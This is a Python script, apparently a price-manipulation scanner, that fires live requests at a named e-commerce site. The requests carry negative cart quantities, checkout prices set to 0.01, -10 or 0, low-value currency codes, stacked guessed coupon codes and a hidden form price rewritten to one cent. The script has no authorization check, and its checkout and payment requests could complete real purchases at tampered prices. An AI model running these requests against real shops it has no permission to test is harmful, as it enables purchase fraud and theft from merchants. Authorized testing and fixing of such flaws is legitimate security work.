#!/usr/bin/env python3
"""
Price Manipulation Vulnerability Tester
Tests for price manipulation in e-commerce and payment systems
"""

import requests
import json
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup

class PriceManipulationTester:
    """Tester for price manipulation vulnerabilities"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

    def scan(self):
        """Run price manipulation tests"""
        print(f"[*] Starting price manipulation testing on {self.target_url}")

        # Test negative quantities
        self._test_negative_quantities()

        # Test parameter tampering
        self._test_parameter_tampering()

        # Test currency confusion
        self._test_currency_confusion()

        # Test discount stacking
        self._test_discount_stacking()

        # Test price in hidden fields
        self._test_hidden_field_manipulation()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_negative_quantities(self):
        """Test negative quantity exploitation"""
        print("[*] Testing negative quantity manipulation...")

        cart_endpoints = [
            '/api/cart/add',
            '/cart/update',
            '/api/cart/update',
            '/checkout/cart',
        ]

        for endpoint in cart_endpoints:
            test_url = urljoin(urlparse(self.target_url).scheme + "://" + urlparse(self.target_url).netloc, endpoint)

            # Test negative quantities
            negative_tests = [
                {'quantity': -1, 'item_id': '123'},
                {'quantity': '-1', 'product_id': '123'},
                {'qty': -10, 'id': '123'},
                {'amount': '-5', 'item': '123'},
            ]

            for test_data in negative_tests:
                try:
                    response = self.session.post(test_url, json=test_data, timeout=10)

                    # Check if negative quantity was accepted
                    if response.status_code in [200, 201]:
                        # Look for success indicators
                        if any(indicator in response.text.lower() for indicator in ['success', 'added', 'updated', 'total']):
                            vuln = {
                                'type': 'Price Manipulation - Negative Quantity',
                                'severity': 'critical',
                                'url': test_url,
                                'payload': test_data,
                                'evidence': 'Negative quantity accepted',
                                'description': 'System accepts negative quantities leading to credit abuse',
                                'cwe': 'CWE-20',
                                'impact': 'Get paid to purchase items, balance manipulation',
                                'remediation': 'Validate quantity > 0 on server-side'
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"[!] CRITICAL: Negative quantity accepted at {endpoint}")
                            return

                except:
                    pass

    def _test_parameter_tampering(self):
        """Test price parameter tampering"""
        print("[*] Testing price parameter tampering...")

        checkout_endpoints = [
            '/api/checkout',
            '/checkout/process',
            '/order/create',
            '/payment/process',
        ]

        for endpoint in checkout_endpoints:
            test_url = urljoin(urlparse(self.target_url).scheme + "://" + urlparse(self.target_url).netloc, endpoint)

            # Test tampering price in request
            tamper_tests = [
                {'item_id': '123', 'price': 0.01, 'quantity': 1},
                {'product_id': '123', 'amount': 1, 'qty': 1},
                {'id': '123', 'price': -10, 'quantity': 1},
                {'item': '123', 'total': 0, 'qty': 1},
                {'product': '123', 'unit_price': 0.01, 'quantity': 10},
            ]

            for test_data in tamper_tests:
                try:
                    # Try POST with JSON
                    response = self.session.post(test_url, json=test_data, timeout=10)

                    if response.status_code in [200, 201, 302]:
                        # Check if order was processed with tampered price
                        success_indicators = ['order confirmed', 'payment successful', 'thank you', 'order placed']

                        if any(indicator in response.text.lower() for indicator in success_indicators):
                            vuln = {
                                'type': 'Price Manipulation - Parameter Tampering',
                                'severity': 'critical',
                                'url': test_url,
                                'payload': test_data,
                                'evidence': 'Tampered price accepted in checkout',
                                'description': 'Price can be modified in client request',
                                'cwe': 'CWE-472',
                                'impact': 'Purchase items at arbitrary prices',
                                'remediation': 'Never trust client-side price data, validate from database'
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"[!] CRITICAL: Price tampering possible at {endpoint}")
                            return

                except:
                    pass

    def _test_currency_confusion(self):
        """Test currency confusion attacks"""
        print("[*] Testing currency confusion...")

        payment_endpoints = [
            '/api/payment',
            '/checkout',
            '/order/create',
        ]

        for endpoint in payment_endpoints:
            test_url = urljoin(urlparse(self.target_url).scheme + "://" + urlparse(self.target_url).netloc, endpoint)

            # Test different currency codes
            currency_tests = [
                {'amount': 100, 'currency': 'USD', 'item_id': '123'},  # Normal
                {'amount': 100, 'currency': 'JPY', 'item_id': '123'},  # 100 JPY = ~0.67 USD
                {'amount': 100, 'currency': 'IDR', 'item_id': '123'},  # Indonesian Rupiah
                {'amount': 100, 'currency': 'VND', 'item_id': '123'},  # Vietnamese Dong
                {'amount': '100 USD', 'currency': 'EUR', 'item_id': '123'},  # Mixed
            ]

            for test_data in currency_tests:
                try:
                    response = self.session.post(test_url, json=test_data, timeout=10)

                    if response.status_code in [200, 201]:
                        # If low-value currency accepted for high-value item
                        if test_data.get('currency') in ['JPY', 'IDR', 'VND']:
                            vuln = {
                                'type': 'Price Manipulation - Currency Confusion',
                                'severity': 'high',
                                'url': test_url,
                                'payload': test_data,
                                'evidence': f'Low-value currency {test_data["currency"]} accepted',
                                'description': 'Different currency codes not properly converted',
                                'cwe': 'CWE-20',
                                'impact': 'Pay significantly less using low-value currency',
                                'remediation': 'Validate and convert currency to base currency server-side'
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"[!] Currency confusion vulnerability")
                            return

                except:
                    pass

    def _test_discount_stacking(self):
        """Test multiple discount stacking"""
        print("[*] Testing discount stacking...")

        discount_endpoints = [
            '/api/apply-discount',
            '/checkout/coupon',
            '/cart/discount',
        ]

        for endpoint in discount_endpoints:
            test_url = urljoin(urlparse(self.target_url).scheme + "://" + urlparse(self.target_url).netloc, endpoint)

            # Try applying multiple discounts
            discount_codes = ['SAVE10', 'DISCOUNT20', 'PROMO15', 'WELCOME', 'FIRST']

            applied_count = 0

            for code in discount_codes:
                try:
                    test_data = {'code': code, 'coupon': code, 'discount_code': code}
                    response = self.session.post(test_url, json=test_data, timeout=10)

                    if response.status_code == 200:
                        if any(indicator in response.text.lower() for indicator in ['applied', 'success', 'discount']):
                            applied_count += 1

                except:
                    pass

            # If multiple discounts applied
            if applied_count > 1:
                vuln = {
                    'type': 'Price Manipulation - Discount Stacking',
                    'severity': 'high',
                    'url': test_url,
                    'evidence': f'{applied_count} discounts applied simultaneously',
                    'description': 'Multiple discount codes can be stacked',
                    'cwe': 'CWE-840',
                    'impact': 'Excessive discounts, potential negative prices',
                    'remediation': 'Limit to one discount per transaction'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] Discount stacking vulnerability ({applied_count} discounts)")
                return

    def _test_hidden_field_manipulation(self):
        """Test hidden field price manipulation"""
        print("[*] Testing hidden field manipulation...")

        try:
            # Get the page with forms
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')

            forms = soup.find_all('form')

            for form in forms:
                # Look for hidden price fields
                hidden_inputs = form.find_all('input', {'type': 'hidden'})

                price_fields = []
                for inp in hidden_inputs:
                    name = inp.get('name', '').lower()
                    if any(keyword in name for keyword in ['price', 'amount', 'total', 'cost']):
                        price_fields.append((inp.get('name'), inp.get('value')))

                if price_fields:
                    # Found hidden price fields
                    action = form.get('action', '')
                    if action:
                        if action.startswith('http'):
                            form_url = action
                        else:
                            form_url = urljoin(self.target_url, action)
                    else:
                        form_url = self.target_url

                    # Try submitting with modified price
                    form_data = {}
                    for inp in form.find_all('input'):
                        name = inp.get('name')
                        value = inp.get('value', '')
                        if name:
                            form_data[name] = value

                    # Modify price fields
                    for field_name, original_value in price_fields:
                        form_data[field_name] = '0.01'  # Set to 1 cent

                    response = self.session.post(form_url, data=form_data, timeout=10)

                    if response.status_code in [200, 302]:
                        vuln = {
                            'type': 'Price Manipulation - Hidden Field Tampering',
                            'severity': 'critical',
                            'url': form_url,
                            'evidence': f'Price in hidden field: {price_fields}',
                            'description': 'Price stored in client-side hidden fields',
                            'cwe': 'CWE-642',
                            'impact': 'Modify prices before submission',
                            'remediation': 'Never store prices in client-side forms'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] CRITICAL: Price in hidden fields")
                        return

        except:
            pass

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 price_manipulation.py <url> [output_file]")
        print("\nExample:")
        print("  python3 price_manipulation.py https://example.com/shop")
        print("\nTests for:")
        print("  - Negative quantity exploitation")
        print("  - Price parameter tampering")
        print("  - Currency confusion attacks")
        print("  - Discount code stacking")
        print("  - Hidden field price manipulation")
        sys.exit(1)

    target = sys.argv[1]
    output = sys.argv[2] if len(sys.argv) > 2 else None

    tester = PriceManipulationTester(target, output)
    results = tester.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Total vulnerabilities: {len(results['vulnerabilities'])}")
    if len(results['vulnerabilities']) > 0:
        print(f"    Critical: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'critical')}")
        print(f"    High: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'high')}")
